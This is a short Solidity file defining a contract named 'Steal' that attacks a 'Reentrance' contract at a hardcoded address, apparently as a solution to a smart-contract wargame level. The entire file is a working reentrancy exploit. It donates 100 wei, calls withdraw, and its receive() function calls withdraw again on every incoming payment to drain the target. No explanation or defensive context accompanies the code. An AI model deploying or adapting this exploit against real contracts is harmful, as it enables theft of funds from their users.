// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; 

import "./Reentrance.sol";

contract Steal{

    
    Reentrance public contrato= Reentrance(0x2B420085C4671023817Fb96E839A3c6b28C0ea39);

    constructor () public payable {}

    function donate() external payable {
        require(address(this).balance>=100 wei);
        contrato.donate{value: 100 wei}(address(this));
    }


    function getBalance(address _to) external view returns (uint){
        return address(_to).balance;
    }

    function withdraw() public{
        contrato.withdraw(100 wei);
    }

    receive() external payable {
        contrato.withdraw(msg.value);
    }
}
